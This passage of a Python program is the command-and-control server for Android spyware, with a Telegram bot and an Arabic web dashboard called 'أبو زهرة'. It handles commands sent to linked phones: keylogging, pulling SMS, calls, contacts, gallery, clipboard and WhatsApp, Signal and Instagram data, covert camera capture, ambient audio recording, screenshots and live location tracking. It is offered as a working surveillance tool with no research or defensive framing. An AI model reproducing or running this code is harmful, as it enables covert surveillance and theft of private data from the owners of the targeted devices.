            await send_message(chat_id, f"📍 فترة الموقع الحالية: <code>{settings.get('location_interval', 60)}</code> ثانية\n\nالاستخدام: /set_location_interval ثوانٍ", reply_markup=build_settings_menu())
    elif cmd == "/auto_location":
        settings = load_settings()
        val = arg1.lower() if arg1 else "toggle"
        if val == "on":
            settings["auto_location"] = True
        elif val == "off":
            settings["auto_location"] = False
        else:
            settings["auto_location"] = not settings.get("auto_location", True)
        save_settings(settings)
        state = "مفعّل ✅" if settings["auto_location"] else "معطّل ❌"
        await send_message(chat_id, f"🗺️ الموقع التلقائي: <b>{state}</b>", reply_markup=build_settings_menu())
    elif cmd == "/auto_sync":
        settings = load_settings()
        val = arg1.lower() if arg1 else "toggle"
        if val == "on":
            settings["auto_sync"] = True
        elif val == "off":
            settings["auto_sync"] = False
        else:
            settings["auto_sync"] = not settings.get("auto_sync", True)
        save_settings(settings)
        state = "مفعّل ✅" if settings["auto_sync"] else "معطّل ❌"
        await send_message(chat_id, f"🔄 المزامنة التلقائية: <b>{state}</b>", reply_markup=build_settings_menu())
    elif cmd == "/language":
        settings = load_settings()
        lang = arg1.lower() if arg1 in ("ar", "en") else settings.get("language", "ar")
        settings["language"] = lang
        save_settings(settings)
        lang_name = "العربية 🇸🇦" if lang == "ar" else "English 🇬🇧"
        await send_message(chat_id, f"🌐 اللغة: <b>{lang_name}</b>", reply_markup=build_settings_menu())
    elif cmd == "/notify":
        settings = load_settings()
        val = arg1.lower() if arg1 else "toggle"
        if val == "on":
            settings["notifications"] = True
        elif val == "off":
            settings["notifications"] = False
        else:
            settings["notifications"] = not settings.get("notifications", True)
        save_settings(settings)
        state = "مفعّلة ✅" if settings["notifications"] else "معطّلة ❌"
        await send_message(chat_id, f"🔔 الإشعارات: <b>{state}</b>", reply_markup=build_settings_menu())

    # ── Monitoring Commands ──
    elif cmd == "/keylogger":
        settings = load_settings()
        val = arg1.lower() if arg1 else "toggle"
        if val == "on":
            settings["keylogger"] = True
        elif val == "off":
            settings["keylogger"] = False
        else:
            settings["keylogger"] = not settings.get("keylogger", False)
        save_settings(settings)
        state = "مفعّل ✅" if settings["keylogger"] else "معطّل ❌"
        if dev_id and dev_id != "none":
            await send_device_command(chat_id, dev_id, f"keylogger_{'on' if settings['keylogger'] else 'off'}", f"⌨️ تسجيل المفاتيح: {state}")
        else:
            await send_message(chat_id, f"⌨️ تسجيل المفاتيح: <b>{state}</b>", reply_markup=build_monitor_menu(dev_id))
    elif cmd == "/keylogger_get":
        await send_device_command(chat_id, dev_id, "keylogger_get", "📥 جلب بيانات المفاتيح")
    elif cmd == "/sim_detect":
        settings = load_settings()
        val = arg1.lower() if arg1 else "toggle"
        if val == "on":
            settings["sim_detect"] = True
        elif val == "off":
            settings["sim_detect"] = False
        else:
            settings["sim_detect"] = not settings.get("sim_detect", False)
        save_settings(settings)
        state = "مفعّل ✅" if settings["sim_detect"] else "معطّل ❌"
        if dev_id and dev_id != "none":
            await send_device_command(chat_id, dev_id, f"sim_detect_{'on' if settings['sim_detect'] else 'off'}", f"📡 كشف الشريحة: {state}")
        else:
            await send_message(chat_id, f"📡 كشف تغيير الشريحة: <b>{state}</b>", reply_markup=build_monitor_menu(dev_id))
    elif cmd == "/wifi_monitor":
        settings = load_settings()
        val = arg1.lower() if arg1 else "toggle"
        if val == "on":
            settings["wifi_monitor"] = True
        elif val == "off":
            settings["wifi_monitor"] = False
        else:
            settings["wifi_monitor"] = not settings.get("wifi_monitor", False)
        save_settings(settings)
        state = "مفعّل ✅" if settings["wifi_monitor"] else "معطّل ❌"
        if dev_id and dev_id != "none":
            await send_device_command(chat_id, dev_id, f"wifi_monitor_{'on' if settings['wifi_monitor'] else 'off'}", f"📶 مراقبة الواي فاي: {state}")
        else:
            await send_message(chat_id, f"📶 مراقبة الواي فاي: <b>{state}</b>", reply_markup=build_monitor_menu(dev_id))

    # ── Server Commands ──
    elif cmd == "/server_status":
        await cmd_status(chat_id)
    elif cmd == "/server_restart":
        append_event("طلب إعادة تشغيل", {"source": "telegram"})
        await send_message(chat_id, "🔄 جارٍ إعادة تشغيل الخادم...", reply_markup=build_server_menu())
        os._exit(0)
    elif cmd == "/clear_data":
        if arg1 and arg1 != "none":
            if remove_device(arg1):
                await send_message(chat_id, f"✅ تم مسح بيانات الجهاز <code>{arg1}</code>", reply_markup=build_server_menu())
            else:
                await send_message(chat_id, f"❌ الجهاز <code>{arg1}</code> غير موجود", reply_markup=build_server_menu())
        else:
            await send_message(chat_id, "⚠️ حدد الجهاز: /clear_data device_id", reply_markup=build_server_menu())
    elif cmd == "/backup":
        devices = get_devices()
        events = load_json(EVENTS_FILE, [])
        settings = load_settings()
        commands = load_json(COMMANDS_FILE, [])
        backup = {
            "timestamp": ts(),
            "devices": devices,
            "events": events[-100:],
            "settings": settings,
            "commands": commands[-50:],
        }
        backup_file = DATA_DIR / f"backup_{int(time.time())}.json"
        save_json(backup_file, backup)
        append_event("إنشاء نسخة احتياطية", {"file": str(backup_file.name)})
        await send_message(chat_id, f"💾 تم إنشاء نسخة احتياطية\n📁 <code>{backup_file.name}</code>", reply_markup=build_server_menu())
    elif cmd == "/export":
        fmt = arg2 if arg2 else (arg1 if arg1 and arg1 in ("json", "csv") else "json")
        did = arg1 if arg1 and arg1 not in ("json", "csv") else "all"
        if fmt == "csv":
            devices = get_devices()
            if did and did != "all":
                devices = [d for d in devices if d["id"] == did]
            output = StringIO()
            if devices:
                headers = list(devices[0].keys())
                output.write(",".join(headers) + "\n")
                for d in devices:
                    output.write(",".join(str(d.get(h, "")) for h in headers) + "\n")
            content = output.getvalue()
            content_type = "text/csv"
        else:
            devices = get_devices()
            if did and did != "all":
                devices = [d for d in devices if d["id"] == did]
            content = json.dumps(devices, ensure_ascii=False, indent=2)
            content_type = "application/json"
        export_file = DATA_DIR / f"export_{did}_{int(time.time())}.{fmt}"
        export_file.write_text(content)
        append_event("تصدير بيانات", {"device": did, "format": fmt})
        await send_message(chat_id, f"📤 تم التصدير\n📁 <code>{export_file.name}</code>\n📊 الصيغة: <code>{fmt}</code>", reply_markup=build_server_menu())
    elif cmd == "/stats":
        devices = get_devices()
        online = sum(1 for d in devices if d.get("active"))
        events = load_json(EVENTS_FILE, [])
        commands = load_json(COMMANDS_FILE, [])
        pending = sum(1 for c in commands if c.get("status") == "pending")
        completed = sum(1 for c in commands if c.get("status") == "completed")
        failed = sum(1 for c in commands if c.get("status") == "failed")
        text = (
            "📈 <b>الإحصائيات</b>\n\n"
            f"⏱️ وقت التشغيل: <code>{format_uptime(uptime())}</code>\n\n"
            f"📱 الأجهزة: <code>{len(devices)}</code>\n"
            f"   🟢 متصل: <code>{online}</code>\n"
            f"   🔴 غير متصل: <code>{len(devices) - online}</code>\n\n"
            f"📨 الرسائل: <code>{messages_sent}</code>\n\n"
            f"📋 الأوامر:\n"
            f"   ⏳ معلقة: <code>{pending}</code>\n"
            f"   ✅ مكتملة: <code>{completed}</code>\n"
            f"   ❌ فاشلة: <code>{failed}</code>\n\n"
            f"📝 الأحداث: <code>{len(events)}</code>\n"
        )
        await send_message(chat_id, text, reply_markup=build_server_menu())

    else:
        await send_message(chat_id, f"❌ أمر غير معروف: <code>{cmd}</code>\n\nاستخدم /help لعرض الأوامر", reply_markup=build_main_menu())


# ═══════════════════════════════════════════════════════════════════════════════
# Callback Query Handler
# ═══════════════════════════════════════════════════════════════════════════════

async def handle_callback_query(callback_query: dict):
    query_id = callback_query.get("id", "")
    data = callback_query.get("data", "")
    message = callback_query.get("message", {})
    chat_id = message.get("chat", {}).get("id", ADMIN_CHAT_ID)
    message_id = message.get("message_id", 0)

    log.info("CALLBACK from %s: %s", chat_id, data)

    # ── Navigation Callbacks ──
    if data == "back_main":
        text = "📋 <b>القائمة الرئيسية</b>\nاختر أحد الأقسام:"
        await edit_message_text(chat_id, message_id, text, reply_markup=build_main_menu())
    elif data == "menu_devices":
        text = "📱 <b>إدارة الأجهزة</b>\nاختر جهازاً أو أضف جديداً:"
        await edit_message_text(chat_id, message_id, text, reply_markup=build_devices_menu())
    elif data == "menu_data":
        text = "📊 <b>جمع البيانات</b>\nاختر نوع البيانات:"
        d = get_first_device()
        dev_id = d["id"] if d else ""
        await edit_message_text(chat_id, message_id, text, reply_markup=build_data_menu(dev_id))
    elif data == "menu_social":
        text = "🌐 <b>الشبكات الاجتماعية</b>\nاختر التطبيق:"
        d = get_first_device()
        dev_id = d["id"] if d else ""
        await edit_message_text(chat_id, message_id, text, reply_markup=build_social_menu(dev_id))
    elif data == "menu_control":
        text = "🎮 <b>التحكم عن بعد</b>\nاختر الإجراء:"
        d = get_first_device()
        dev_id = d["id"] if d else ""
        await edit_message_text(chat_id, message_id, text, reply_markup=build_control_menu(dev_id))
    elif data == "menu_location":
        text = "📍 <b>الموقع الجغرافي</b>\nاختر الإجراء:"
        d = get_first_device()
        dev_id = d["id"] if d else ""
        await edit_message_text(chat_id, message_id, text, reply_markup=build_location_menu(dev_id))
    elif data == "menu_apps":
        text = "⚙️ <b>إدارة التطبيقات</b>\nاختر الإجراء:"
        d = get_first_device()
        dev_id = d["id"] if d else ""
        await edit_message_text(chat_id, message_id, text, reply_markup=build_apps_menu(dev_id))
    elif data == "menu_settings":
        text = "🔧 <b>الإعدادات</b>\nاختر الإعداد:"
        await edit_message_text(chat_id, message_id, text, reply_markup=build_settings_menu())
    elif data == "menu_monitor":
        text = "🔍 <b>المراقبة</b>\nاختر نوع المراقبة:"
        d = get_first_device()
        dev_id = d["id"] if d else ""
        await edit_message_text(chat_id, message_id, text, reply_markup=build_monitor_menu(dev_id))
    elif data == "menu_server":
        text = "🖥️ <b>إدارة الخادم</b>\nاختر الإجراء:"
        await edit_message_text(chat_id, message_id, text, reply_markup=build_server_menu())

    # ── Device Selection ──
    elif data.startswith("dev_"):
        device_id = data[4:]
        d = find_device(device_id)
        if d:
            status = "🟢 متصل" if d.get("active") else "🔴 غير متصل"
            text = f"📱 <b>{d.get('name', device_id)}</b>\nالحالة: {status}\n\nاختر الإجراء:"
            await edit_message_text(chat_id, message_id, text, reply_markup=build_device_menu(device_id))
    elif data.startswith("unlink_"):
        device_id = data[7:]
        if remove_device(device_id):
            text = f"✅ تم فصل الجهاز <code>{device_id}</code>"
            await edit_message_text(chat_id, message_id, text, reply_markup=build_devices_menu())
    elif data == "cmd_link":
        await cmd_link(chat_id)

    # ── Device Commands via Callback ──
    elif data.startswith("cmd_"):
        parts = data.split("_", 2)
        cmd_name = parts[1]
        device_id = parts[2] if len(parts) > 2 else ""

        command_map = {
            "sms": ("get_sms", "📲 جلب الرسائل SMS"),
            "calls": ("get_calls", "📞 جلب سجل المكالمات"),
            "contacts": ("get_contacts", "📇 جلب جهات الاتصال"),
            "location": ("get_location", "📍 جلب الموقع"),
            "notifications": ("get_notifications", "🔔 جلب الإشعارات"),
            "apps": ("get_apps", "📱 جلب التطبيقات"),
            "info": ("get_info", "ℹ️ جلب معلومات الجهاز"),
            "battery": ("get_battery", "🔋 جلب حالة البطارية"),
            "gallery": ("get_gallery", "🖼️ جلب المعرض"),
            "clipboard": ("get_clipboard", "📋 جلب الحافظة"),
            "all": ("get_all", "📥 جلب جميع البيانات"),
            "whatsapp": ("get_whatsapp", "💬 جلب بيانات واتساب"),
            "telegram": ("get_telegram", "✈️ جلب بيانات تليجرام"),
            "instagram": ("get_instagram", "📷 جلب بيانات انستجرام"),
            "messenger": ("get_messenger", "🔵 جلب بيانات ماسنجر"),
            "snapchat": ("get_snapchat", "👻 جلب بيانات سناب شات"),
            "tiktok": ("get_tiktok", "🎵 جلب بيانات تيك توك"),
            "twitter": ("get_twitter", "🐦 جلب بيانات تويتر"),
            "viber": ("get_viber", "💜 جلب بيانات فايبر"),
            "signal": ("get_signal", "🔵 جلب بيانات سيجنال"),
            "ping": ("ping", "📡 فحص اتصال الجهاز"),
            "vibrate": ("vibrate", "📳 اهتزاز الجهاز"),
            "ring": ("ring", "🔔 رنين الجهاز"),
            "screenshot": ("screenshot", "📸 لقطة شاشة"),
            "front": ("front_camera", "📷 كاميرا أمامية"),
            "back": ("back_camera", "📷 كاميرا خلفية"),
            "record": ("record_audio", "🎙️ تسجيل صوت محيط"),
            "flash": ("flash_on", "🔦 تشغيل الفلاش"),
            "flashoff": ("flash_off", "🔦 إطفاء الفلاش"),
            "location": ("get_location", "📍 جلب الموقع"),
            "locationlive": ("location_live", "🗺️ بدء التتبع المباشر"),
            "locationstop": ("location_stop", "⏹️ إيقاف التتبع"),
            "locationhistory": ("location_history", "📜 سجل المواقع"),
            "app": ("get_apps", "📱 جلب التطبيقات"),
            "appusage": ("app_usage", "📊 استخدام التطبيقات"),
            "screentime": ("screen_time", "⏱️ وقت الشاشة"),
            "keylogger": ("keylogger_get", "⏩ جلب بيانات المفاتيح"),
            "keyloggerget": ("keylogger_get", "📥 جلب بيانات المفاتيح"),
            "simdetect": ("sim_detect_status", "📡 حالة كشف الشريحة"),
            "wifimonitor": ("wifi_monitor_status", "📶 حالة مراقبة الواي فاي"),
        }

        # Handle flash_off specially due to underscore
        if data.startswith("cmd_flash_off"):
            cmd_key, display = "flash_off", "🔦 إطفاء الفلاش"
            device_id = data[len("cmd_flash_off_"):]
            await send_device_command(chat_id, device_id, cmd_key, display)
            await answer_callback_query(query_id)
            return

        # Handle front_camera / back_camera
        if data.startswith("cmd_front_camera"):
            device_id = data[len("cmd_front_camera_"):]
            await send_device_command(chat_id, device_id, "front_camera", "📷 كاميرا أمامية")
            await answer_callback_query(query_id)
            return
        if data.startswith("cmd_back_camera"):
            device_id = data[len("cmd_back_camera_"):]
            await send_device_command(chat_id, device_id, "back_camera", "📷 كاميرا خلفية")
            await answer_callback_query(query_id)
            return
        if data.startswith("cmd_record_audio"):
            device_id = data[len("cmd_record_audio_"):]
            await send_device_command(chat_id, device_id, "record_audio", "🎙️ تسجيل صوت محيط")
            await answer_callback_query(query_id)
            return
        if data.startswith("cmd_location_live"):
            device_id = data[len("cmd_location_live_"):]
            await send_device_command(chat_id, device_id, "location_live", "🗺️ بدء التتبع المباشر")
            await answer_callback_query(query_id)
            return
        if data.startswith("cmd_location_stop"):
            device_id = data[len("cmd_location_stop_"):]
            await send_device_command(chat_id, device_id, "location_stop", "⏹️ إيقاف التتبع")
            await answer_callback_query(query_id)
            return
        if data.startswith("cmd_location_history"):
            device_id = data[len("cmd_location_history_"):]
            await send_device_command(chat_id, device_id, "location_history", "📜 سجل المواقع")
            await answer_callback_query(query_id)
            return
        if data.startswith("cmd_app_usage"):
            device_id = data[len("cmd_app_usage_"):]
            await send_device_command(chat_id, device_id, "app_usage", "📊 استخدام التطبيقات")
            await answer_callback_query(query_id)
            return
        if data.startswith("cmd_screen_time"):
            device_id = data[len("cmd_screen_time_"):]
            await send_device_command(chat_id, device_id, "screen_time", "⏱️ وقت الشاشة")
            await answer_callback_query(query_id)
            return
        if data.startswith("cmd_keylogger_get"):
            device_id = data[len("cmd_keylogger_get_"):]
            await send_device_command(chat_id, device_id, "keylogger_get", "📥 جلب بيانات المفاتيح")
            await answer_callback_query(query_id)
            return

        if cmd_name in command_map:
            cmd_key, display = command_map[cmd_name]
            await send_device_command(chat_id, device_id, cmd_key, display)
        else:
            text = f"⚠️ الأمر <code>{cmd_name}</code> للجهاز <code>{device_id}</code>"
            await send_message(chat_id, text, reply_markup=build_back_menu())

    # ── Sub-menus via callback ──
    elif data.startswith("social_"):
        device_id = data[7:]
        text = "🌐 <b>الشبكات الاجتماعية</b>"
        await edit_message_text(chat_id, message_id, text, reply_markup=build_social_menu(device_id))
    elif data.startswith("control_"):
        device_id = data[8:]
        text = "🎮 <b>التحكم عن بعد</b>"
        await edit_message_text(chat_id, message_id, text, reply_markup=build_control_menu(device_id))
    elif data.startswith("camera_"):
        device_id = data[7:]
        text = "📷 <b>الكاميرا</b>"
        await edit_message_text(chat_id, message_id, text, reply_markup=build_camera_menu(device_id))

    # ── Server Commands via Callback ──
    elif data == "cmd_server_status":
        devices = get_devices()
        online = sum(1 for d in devices if d.get("active"))
        text = (
            f"📊 <b>حالة الخادم</b>\n\n"
            f"🟢 يعمل\n"
            f"⏱️ التشغيل: {format_uptime(uptime())}\n"
            f"📡 المنفذ: {SERVER_PORT}\n"
            f"📱 الأجهزة: {len(devices)} ({online} متصل)"
        )
        await edit_message_text(chat_id, message_id, text, reply_markup=build_server_menu())
    elif data == "cmd_server_restart":
        append_event("طلب إعادة تشغيل", {"source": "telegram_callback"})
        await edit_message_text(chat_id, message_id, "🔄 جارٍ إعادة تشغيل الخادم...")
        os._exit(0)
    elif data == "cmd_backup":
        devices = get_devices()
        events = load_json(EVENTS_FILE, [])
        settings = load_settings()
        backup = {
            "timestamp": ts(),
            "devices": devices,
            "events": events[-100:],
            "settings": settings,
        }
        backup_file = DATA_DIR / f"backup_{int(time.time())}.json"
        save_json(backup_file, backup)
        text = f"💾 تم إنشاء نسخة احتياطية\n📁 <code>{backup_file.name}</code>"
        await edit_message_text(chat_id, message_id, text, reply_markup=build_server_menu())
    elif data == "cmd_stats":
        devices = get_devices()
        online = sum(1 for d in devices if d.get("active"))
        text = (
            f"📈 <b>الإحصائيات</b>\n\n"
            f"⏱️ التشغيل: {format_uptime(uptime())}\n"
            f"📱 الأجهزة: {len(devices)} ({online} متصل)\n"
            f"📨 الرسائل: {messages_sent}"
        )
        await edit_message_text(chat_id, message_id, text, reply_markup=build_server_menu())
    elif data == "cmd_geo_fence":
        settings = load_settings()
        fences = settings.get("geofences", [])
        text = "🎮 <b>المناطق الجغرافية</b>\n\n"
        if fences:
            for i, f in enumerate(fences):
                text += f"{i+1}. {f.get('name', '—')} - {f.get('radius', 0)}م\n"
        else:
            text += "لا توجد مناطق محددة"
        await edit_message_text(chat_id, message_id, text, reply_markup=build_location_menu())
    elif data == "no_action":
        await answer_callback_query(query_id, "لا يوجد إجراء متاح")
    else:
        await answer_callback_query(query_id, f"غير معروف: {data}")

    await answer_callback_query(query_id)


# ═══════════════════════════════════════════════════════════════════════════════
# getUpdates Polling Loop
# ═══════════════════════════════════════════════════════════════════════════════

async def poll_updates():
    global tg_offset, polling_active
    polling_active = True
    log.info("Starting getUpdates polling...")
    append_event("بدء استطلاع التحديثات", {})

    while polling_active:
        try:
            result = await tg_request("getUpdates", {
                "offset": tg_offset,
                "timeout": 30,
                "allowed_updates": ["message", "callback_query"],
            })
            if not result or not result.get("ok"):
                await asyncio.sleep(2)
                continue

            updates = result.get("result", [])
            for update in updates:
                tg_offset = update.get("update_id", 0) + 1

                # Handle message
                if "message" in update:
                    message = update["message"]
                    chat_id = message.get("chat", {}).get("id")
                    user_id = message.get("from", {}).get("id")
                    text = message.get("text", "")

                    if chat_id != ADMIN_CHAT_ID:
                        log.warning("Unauthorized access from chat_id=%s user_id=%s", chat_id, user_id)
                        continue

                    if text.startswith("/"):
                        await handle_command(chat_id, text)
                    elif message.get("new_chat_members"):
                        for member in message["new_chat_members"]:
                            if member.get("id") == (await tg_request("getMe", {})).get("result", {}).get("id"):
                                await send_message(chat_id, "🟢 تم تفعيل البوت بنجاح! استخدم /start للبدء.")

                # Handle callback query
                elif "callback_query" in update:
                    cb = update["callback_query"]
                    cb_chat_id = cb.get("message", {}).get("chat", {}).get("id")
                    cb_user_id = cb.get("from", {}).get("id")
                    if cb_chat_id != ADMIN_CHAT_ID or cb_user_id != ADMIN_CHAT_ID:
                        continue
                    await handle_callback_query(cb)

        except asyncio.CancelledError:
            break
        except Exception as exc:
            log.error("Polling error: %s", exc)
            append_event("خطأ في الاستطلاع", {"error": str(exc)}, "error")
            await asyncio.sleep(5)


# ═══════════════════════════════════════════════════════════════════════════════
# Web Dashboard HTML
# ═══════════════════════════════════════════════════════════════════════════════

DASHBOARD_HTML = r"""<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>أبو زهرة - لوحة التحكم</title>
<style>
:root{--bg:#0a0a1a;--surface:#12122a;--surface2:#1a1a3e;--border:#2a2a4a;--accent:#e94560;--accent2:#ff6b81;--text:#e0e0e0;--text2:#888;--success:#00c853;--warning:#ffc107;--danger:#ff1744;--info:#64b5f6}
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Segoe UI',Tahoma,Arial,sans-serif;background:var(--bg);color:var(--text);min-height:100vh;direction:rtl}
a{color:var(--accent);text-decoration:none}

/* Login */
.login-wrap{display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
.login-box{background:var(--surface);border:1px solid var(--border);border-radius:16px;padding:40px;width:100%;max-width:400px;text-align:center}
.login-box h1{color:var(--accent);font-size:1.8rem;margin-bottom:8px}
.login-box p{color:var(--text2);margin-bottom:24px;font-size:.9rem}
.login-box input{width:100%;padding:12px 16px;background:var(--surface2);border:1px solid var(--border);border-radius:8px;color:var(--text);font-size:1rem;margin-bottom:12px;text-align:right;outline:none;transition:border .2s}
.login-box input:focus{border-color:var(--accent)}
.login-box button{width:100%;padding:12px;background:var(--accent);color:#fff;border:none;border-radius:8px;font-size:1rem;cursor:pointer;transition:background .2s}
.login-box button:hover{background:var(--accent2)}
.login-error{color:var(--danger);font-size:.85rem;margin-top:12px;display:none}

/* Sidebar */
.sidebar{position:fixed;right:0;top:0;width:240px;height:100vh;background:var(--surface);border-left:1px solid var(--border);z-index:100;transition:transform .3s;overflow-y:auto}
.sidebar.collapsed{transform:translateX(100%)}
.sidebar-header{padding:20px;text-align:center;border-bottom:1px solid var(--border)}
.sidebar-header h2{color:var(--accent);font-size:1.2rem}
.sidebar-header .dot{width:10px;height:10px;border-radius:50%;background:var(--success);display:inline-block;margin-left:6px;box-shadow:0 0 8px var(--success)}
.nav-item{display:flex;align-items:center;gap:10px;padding:12px 20px;cursor:pointer;transition:all .2s;color:var(--text2);font-size:.9rem;border-right:3px solid transparent}
.nav-item:hover,.nav-item.active{background:var(--surface2);color:var(--accent);border-right-color:var(--accent)}
.nav-item .icon{font-size:1.1rem;width:24px;text-align:center}

/* Main */
.main{margin-right:240px;padding:0;transition:margin .3s}
.main.expanded{margin-right:0}
.topbar{background:var(--surface);border-bottom:1px solid var(--border);padding:16px 24px;display:flex;justify-content:space-between;align-items:center;position:sticky;top:0;z-index:50}
.topbar h1{font-size:1.1rem;color:var(--text)}
.topbar-actions{display:flex;gap:12px;align-items:center}
.hamburger{display:none;background:none;border:none;color:var(--text);font-size:1.5rem;cursor:pointer}
.content{padding:24px}

/* Cards */
.stats-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:16px;margin-bottom:24px}
.stat-card{background:var(--surface);border:1px solid var(--border);border-radius:12px;padding:20px;position:relative;overflow:hidden}
.stat-card::after{content:'';position:absolute;top:0;right:0;width:4px;height:100%;background:var(--accent)}
.stat-card .label{font-size:.8rem;color:var(--text2);margin-bottom:8px}
.stat-card .value{font-size:1.8rem;font-weight:700;color:#fff}
.stat-card .sub{font-size:.75rem;color:var(--text2);margin-top:4px}

/* Tables */
.data-table{width:100%;border-collapse:collapse;background:var(--surface);border-radius:12px;overflow:hidden;border:1px solid var(--border)}
.data-table th,.data-table td{text-align:right;padding:12px 16px;border-bottom:1px solid var(--border)}
.data-table th{background:var(--surface2);color:var(--accent);font-size:.85rem;font-weight:600}
.data-table tr:hover{background:var(--surface2)}

/* Buttons */
.btn{padding:8px 16px;border:none;border-radius:8px;cursor:pointer;font-size:.85rem;font-family:inherit;transition:all .2s;display:inline-flex;align-items:center;gap:6px}
.btn-primary{background:var(--accent);color:#fff}.btn-primary:hover{background:var(--accent2)}
.btn-danger{background:var(--danger);color:#fff}.btn-danger:hover{background:#c62828}
.btn-success{background:var(--success);color:#fff}.btn-success:hover{background:#00a844}
.btn-outline{background:transparent;color:var(--accent);border:1px solid var(--accent)}.btn-outline:hover{background:var(--accent);color:#fff}
.btn-sm{padding:4px 10px;font-size:.78rem}

/* Badges */
.badge{display:inline-block;padding:3px 10px;border-radius:20px;font-size:.75rem;font-weight:600}
.badge-success{background:rgba(0,200,83,.15);color:var(--success)}
.badge-danger{background:rgba(255,23,68,.15);color:var(--danger)}
.badge-warning{background:rgba(255,193,7,.15);color:var(--warning)}
.badge-info{background:rgba(100,181,246,.15);color:var(--info)}

/* Tabs */
.tabs{display:flex;gap:4px;margin-bottom:20px;border-bottom:1px solid var(--border);padding-bottom:8px;overflow-x:auto}
.tab{padding:8px 16px;cursor:pointer;font-size:.85rem;color:var(--text2);border-radius:8px 8px 0 0;transition:all .2s;white-space:nowrap}
.tab:hover,.tab.active{color:var(--accent);background:var(--surface2)}

/* Log box */
.log-container{background:var(--surface);border:1px solid var(--border);border-radius:12px;padding:16px;max-height:400px;overflow-y:auto;font-family:'Courier New',monospace;font-size:.8rem;line-height:1.8}
.log-entry{padding:2px 0}
.log-ok{color:var(--success)}.log-warn{color:var(--warning)}.log-err{color:var(--danger)}.log-info{color:var(--info)}

/* Command center */
.cmd-form{background:var(--surface);border:1px solid var(--border);border-radius:12px;padding:20px;margin-bottom:20px}
.cmd-form h3{color:var(--accent);margin-bottom:16px;font-size:1rem}
.form-row{display:flex;gap:12px;margin-bottom:12px;flex-wrap:wrap}
.form-row label{font-size:.85rem;color:var(--text2);min-width:80px;display:flex;align-items:center}
.form-row select,.form-row input{flex:1;padding:8px 12px;background:var(--surface2);border:1px solid var(--border);border-radius:8px;color:var(--text);font-family:inherit;font-size:.85rem;outline:none}
.form-row select:focus,.form-row input:focus{border-color:var(--accent)}
.cmd-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(120px,1fr));gap:8px;margin-top:12px}
.cmd-btn{padding:8px;background:var(--surface2);border:1px solid var(--border);border-radius:8px;color:var(--text);cursor:pointer;font-size:.78rem;text-align:center;transition:all .2s}
.cmd-btn:hover{border-color:var(--accent);color:var(--accent);background:rgba(233,69,96,.1)}

/* Sections */
.section-title{font-size:1rem;color:var(--accent);margin:20px 0 12px;border-right:3px solid var(--accent);padding-right:12px}
.empty-state{text-align:center;color:var(--text2);padding:40px;font-size:.9rem}

/* Map placeholder */
.map-container{background:var(--surface);border:1px solid var(--border);border-radius:12px;height:300px;display:flex;align-items:center;justify-content:center;color:var(--text2);font-size:.9rem;position:relative;overflow:hidden}
.map-container iframe{width:100%;height:100%;border:none}

/* Export buttons */
.export-row{display:flex;gap:8px;margin:12px 0}

/* Modal */
.modal-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.7);z-index:200;justify-content:center;align-items:center}
.modal-overlay.show{display:flex}
.modal{background:var(--surface);border:1px solid var(--border);border-radius:16px;padding:24px;width:90%;max-width:600px;max-height:80vh;overflow-y:auto}
.modal h3{color:var(--accent);margin-bottom:16px}
.modal-close{float:left;background:none;border:none;color:var(--text2);font-size:1.5rem;cursor:pointer}

/* Settings page */
.setting-group{background:var(--surface);border:1px solid var(--border);border-radius:12px;padding:20px;margin-bottom:16px}
.setting-group h3{color:var(--accent);margin-bottom:12px;font-size:.95rem}
.setting-row{display:flex;justify-content:space-between;align-items:center;padding:8px 0;border-bottom:1px solid var(--border)}
.setting-row:last-child{border-bottom:none}
.toggle{width:44px;height:24px;background:var(--border);border-radius:12px;cursor:pointer;position:relative;transition:background .2s}
.toggle.on{background:var(--accent)}
.toggle::after{content:'';position:absolute;width:20px;height:20px;background:#fff;border-radius:50%;top:2px;right:2px;transition:transform .2s}
.toggle.on::after{transform:translateX(-20px)}

/* Responsive */
@media(max-width:768px){
.sidebar{transform:translateX(100%)}
.sidebar.open{transform:translateX(0)}
.main{margin-right:0!important}
.hamburger{display:block}
.stats-grid{grid-template-columns:repeat(auto-fit,minmax(150px,1fr))}
.form-row{flex-direction:column}
.form-row label{min-width:auto}
}

/* Scrollbar */
::-webkit-scrollbar{width:6px}
::-webkit-scrollbar-track{background:var(--bg)}
::-webkit-scrollbar-thumb{background:var(--border);border-radius:3px}
::-webkit-scrollbar-thumb:hover{background:var(--accent)}

/* Animations */
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.5}}
.pulse{animation:pulse 2s infinite}
@keyframes slideIn{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}
.slide-in{animation:slideIn .3s ease}
</style>
</head>
<body>

<!-- Login Page -->
<div class="login-wrap" id="loginPage">
<div class="login-box">
<h1>&#x1F9D1;&#x200D;&#x1F9B0;</h1>
<h2>أبو زهرة</h2>
<p>لوحة التحكم الشاملة</p>
<input type="text" id="loginUser" placeholder="اسم المستخدم" value="admin" autocomplete="off">
<input type="password" id="loginPass" placeholder="كلمة المرور">
<button onclick="doLogin()">تسجيل الدخول</button>
<div class="login-error" id="loginError">اسم المستخدم أو كلمة المرور غير صحيحة</div>
</div>
</div>

<!-- Dashboard -->
<div id="dashboardPage" style="display:none">
<!-- Sidebar -->
<div class="sidebar" id="sidebar">
<div class="sidebar-header">
<h2>&#x1F534; أبو زهرة</h2>
<span class="dot pulse"></span> <span style="font-size:.8rem;color:var(--text2)">متصل</span>
</div>
<div class="nav-item active" data-page="home" onclick="showPage('home')"><span class="icon">&#x1F3E0;</span> الرئيسية</div>
<div class="nav-item" data-page="devices" onclick="showPage('devices')"><span class="icon">&#x1F4F1;</span> الأجهزة</div>
<div class="nav-item" data-page="map" onclick="showPage('map')"><span class="icon">&#x1F5FA;</span> الخريطة</div>
<div class="nav-item" data-page="data" onclick="showPage('data')"><span class="icon">&#x1F4CA;</span> البيانات</div>
<div class="nav-item" data-page="commands" onclick="showPage('commands')"><span class="icon">&#x1F3AE;</span> مركز الأوامر</div>
<div class="nav-item" data-page="logs" onclick="showPage('logs')"><span class="icon">&#x1F4DD;</span> سجل الأحداث</div>
